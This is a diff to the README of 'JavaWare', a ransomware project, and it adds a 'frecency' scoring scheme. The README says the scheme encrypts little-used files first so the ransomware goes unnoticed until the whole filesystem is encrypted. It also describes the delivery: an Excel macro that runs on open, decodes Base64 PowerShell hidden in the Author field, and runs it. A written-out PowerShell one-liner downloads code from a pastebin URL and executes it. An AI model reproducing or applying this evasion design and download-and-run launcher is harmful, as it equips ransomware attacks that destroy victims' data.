@@ -10,6 +10,25 @@ JavaWare is a ransomware which will observe your system, learn which files you u
 
 ### How does it learn which files I use?
 Maths. 
+It uses a metric called *freceny* (frequency + recency) to give each file a score. Using the idea of exponential decay, it ensures that most recently used files are scored higher, and as it observes your system over the course of a week, the more a file is accessed in this time, the higher the score. It then encrypts in such a way so that files that you are not likely to be using (i.e. low scored) first, this ensures that it can go as long as possible without being noticed, allowing it to encrypt the entire filesystem. 
+
+<img src="http://latex.codecogs.com/gif.latex?\gamma=\sum_{i=1}^n+\beta" border="0"/>
+<img src="http://latex.codecogs.com/gif.latex?\beta=p\cdot {e^{-a\lambda}}" border="0"/>
+
+Where <img src="http://latex.codecogs.com/gif.latex?p" border="0"/> is a recency weight, <img src="http://latex.codecogs.com/gif.latex?a" border="0"/> is a frequency ranking (the time since last modification in hours), and 
+<img src="http://latex.codecogs.com/gif.latex?\lambda" border="0"/> is a constant
+
+
+|Recency Bucket | Score |
+|---------------|-------|
+| Today         | 1.0   |
+| Last 5 Days   | 0.9   |
+| Last 10 Days  | 0.7   |
+| Last 30 Days  | 0.4   |
+| Last 90 Days  | 0.1   |
+| > 90 Days     | 0.0   |
+
+<img src="http://latex.codecogs.com/gif.latex?\lambda=\frac{\ln 2}{30}" border="0"/>
 
 ### How does it encrypt? :lock:
 AES 128 bit Encryption in CBC Mode (Counter Block Mode ) PKCS5 Padding <br/>
@@ -19,7 +38,7 @@ AES is a symmetric encryption algorithm which works on blocks of a fixed size (1
 *FileTypes.java* defines what type of files to encrypt, it includes common document types and so will avoid program files to ensure your system is still functional. Similarly, *AvoidedDir.java* includes directories to avoid in traversal, such as *Windows* and *Program Files*. 
 
 ### How does it launch?
-The Microsoft Excel file, *August Report.xlsm* contains a Macro which is run on Workbook Open. Encoded Base64 PowerShell code is hidden within this file under the 'Author' field[1]. So the macro calls a function which gets the author, decodes it, and then runs the shell. The PowerShell script is: 
+The Microsoft Excel file, *August Report.xlsm* contains a Macro which is run on Workbook Open. Encoded Base64 PowerShell code is hidden within this file under the 'Author' field[2]. So the macro calls a function which gets the author, decodes it, and then runs the shell. The PowerShell script is: 
 ```powershell
 Powershell Invoke-Expression -Command  $([string]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-WebRequest -Uri https://pastebin.com/raw/1538VQvN).content))))
 ```
@@ -43,6 +62,7 @@ Start-Process -FilePath $java -ArgumentList '--module-path "C:\temp\javafx-sdk-1
 
 
 ### References:
-[\[1\]: The Increased Use of PowerShell in Attacks - Symantec](https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf) <br/>
+[\[1\]: Frecency Algorithm] (https://developer.mozilla.org/en-US/docs/Mozilla/Tech/Places/Frecency_algorithm) <br/> 
+[\[2\]: The Increased Use of PowerShell in Attacks - Symantec](https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf) <br/>
 Gave me the idea to put my powershell code in the auhtor field, and other useful powershell commands.
 
